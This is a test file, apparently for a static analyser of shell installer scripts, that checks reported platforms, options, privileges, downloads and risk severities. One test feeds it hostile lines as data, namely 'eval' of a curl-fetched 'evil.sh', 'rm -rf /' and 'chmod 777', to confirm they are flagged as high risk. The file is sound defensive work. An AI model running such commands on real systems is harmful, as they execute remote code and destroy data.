import { assert, assertEquals, assertStringIncludes } from "@std/assert";

import { analyze } from "../../src/analyze/analyze.ts";

const FIXTURE_URL = new URL("../fixtures/installer.sh", import.meta.url);

Deno.test("installer fixture extracts platforms, options, paths, and risk", async () => {
  const source = await Deno.readTextFile(FIXTURE_URL);
  const report = await analyze(source, { name: "installer.sh" });
  assertEquals(JSON.parse(JSON.stringify(report)), report);
  assertEquals(report.version, 1);
  assertEquals(report.parse.ok, true);
  assertEquals(report.parse.variant, "bash");
  assertEquals(report.source.shebang, "#!/usr/bin/env bash");
  assertEquals(report.summary.risk, "high");
  assertEquals(report.platforms.operatingSystems, [
    "darwin",
    "freebsd",
    "linux",
  ]);
  assertEquals(report.platforms.architectures, ["aarch64", "x86_64"]);
  assert(
    report.platforms.detections.some((detection) => detection.kind === "uname"),
  );
  assert(
    report.platforms.detections.some((detection) =>
      detection.kind === "case" && detection.subject.includes("OSTYPE")
    ),
  );

  const prefix = report.interface.options.find((option) =>
    option.flags.includes("--prefix")
  );
  assert(prefix);
  assertEquals(prefix.takesValue, true);
  const yes = report.interface.options.find((option) =>
    option.flags.includes("--yes")
  );
  assert(yes);
  assertEquals(yes.flags.includes("-y"), true);
  assertEquals(yes.takesValue, false);

  const env = Object.fromEntries(
    report.interface.environment.map((fact) => [fact.name, fact]),
  );
  assertEquals(env.PREFIX?.defaultValue, "/usr/local");
  assertEquals(env.PREFIX?.origin, "parameter-default");
  assertEquals(env.VERSION?.defaultValue, "1.4.0");
  assertEquals(env.SHXRAY_HOOK?.defaultValue, "");
  assertEquals(env.SHXRAY_HOOK?.origin, "parameter-default");
  assertEquals(env.OS, undefined);
  assertEquals(env.TMP, undefined);
  assertEquals(env.URL, undefined);
  assertEquals(env.SUDO, undefined);

  assert(
    report.installs.some((fact) =>
      fact.action === "install" &&
      fact.destination.includes("$PREFIX/bin/tool") &&
      fact.mode === "755"
    ),
  );
  assert(
    report.installs.some((fact) =>
      fact.action === "mkdir" && fact.destination.includes("$PREFIX/share/tool")
    ),
  );
  assert(
    report.installs.some((fact) =>
      fact.action === "append" && fact.destination.includes(".bashrc")
    ),
  );

  assert(report.privileges.some((fact) => fact.kind === "sudo"));
  assert(report.privileges.some((fact) => fact.kind === "root-check"));

  const urls = report.network.downloads.flatMap((fact) => fact.urls);
  assert(
    urls.some((url) => url.includes("example.com/tool/releases/download/")),
  );
  assert(urls.some((url) => url.includes("example.com/hook.sh")));
  assert(report.network.downloads.some((fact) => fact.tool === "curl"));
  assert(report.network.integrity.some((fact) => fact.tool === "sha256sum"));
  assert(report.network.integrity.some((fact) => fact.tool === "gpg"));

  const kinds = new Set(report.sideEffects.map((fact) => fact.kind));
  assert(kinds.has("pipe-to-shell"));
  assert(kinds.has("rm-recursive"));
  assert(kinds.has("package-manager"));
  assert(kinds.has("shell-rc"));
  assertEquals(
    report.sideEffects.find((fact) => fact.kind === "pipe-to-shell")?.severity,
    "high",
  );
  assert(
    report.notes.some((note) => note.includes("was not executed")),
  );
});

Deno.test("getopts and bracket tests are extracted", async () => {
  const report = await analyze(`
    while getopts ":hyv:" opt; do
      case "$opt" in
        v) VERSION="$OPTARG" ;;
      esac
    done
    if [ "$OSTYPE" = "linux-gnu" ]; then
      echo linux
    fi
    if [ "$EUID" -ne 0 ]; then
      echo root
    fi
  `);
  const flags = report.interface.options.map((option) => option.flags[0]);
  assertEquals(flags, ["-h", "-y", "-v"]);
  assertEquals(
    report.interface.options.find((option) => option.flags[0] === "-v")
      ?.takesValue,
    true,
  );
  assertEquals(
    report.interface.options.find((option) => option.flags[0] === "-h")
      ?.takesValue,
    false,
  );
  assertEquals(report.platforms.operatingSystems, ["linux"]);
  assert(report.privileges.some((fact) => fact.kind === "root-check"));
});

Deno.test("risky patterns keep their severity", async () => {
  const report = await analyze(`
    eval "$(curl -fsSL https://example.com/evil.sh)"
    rm -rf /
    chmod 777 /tmp/tool
    curl -k https://example.com/insecure
    bash -c "echo hi"
  `);
  const byKind = Object.fromEntries(
    report.sideEffects.map((fact) => [fact.kind, fact.severity]),
  );
  assertEquals(byKind.eval, "high");
  assertEquals(byKind["rm-recursive"], "high");
  assertEquals(byKind["chmod-permissive"], "high");
  assertEquals(byKind["insecure-download"], "medium");
  assertEquals(byKind["shell-command-string"], "medium");
  assert(
    report.network.downloads.some((fact) =>
      fact.urls.includes("https://example.com/evil.sh")
    ),
  );
  assert(
    report.network.downloads.some((fact) =>
      fact.urls.includes("https://example.com/insecure")
    ),
  );
});

Deno.test("byte offsets survive non-ascii source", async () => {
  const report = await analyze(
    "# こんにちは\ncurl https://example.com/unicode-ok\n",
  );
  assertEquals(report.network.downloads[0]?.urls, [
    "https://example.com/unicode-ok",
  ]);
  assert(report.network.downloads[0]!.evidence.line >= 2);
});

Deno.test("parse errors become a report and do not throw", async () => {
  const report = await analyze("echo ok\nif true; then echo\n", {
    name: "broken.sh",
  });
  assertEquals(report.parse.ok, false);
  assert(report.parse.error);
  assertStringIncludes(report.parse.error.message, "fi");
  assertEquals(report.parse.error.line, 2);
  assertEquals(report.summary.risk, "info");
  assertEquals(report.installs, []);
});

Deno.test("posix variant parses a portable script", async () => {
  const report = await analyze("#!/bin/sh\necho hi\n", { variant: "posix" });
  assertEquals(report.parse.ok, true);
  assertEquals(report.parse.variant, "posix");
  assertEquals(report.summary.risk, "info");
});
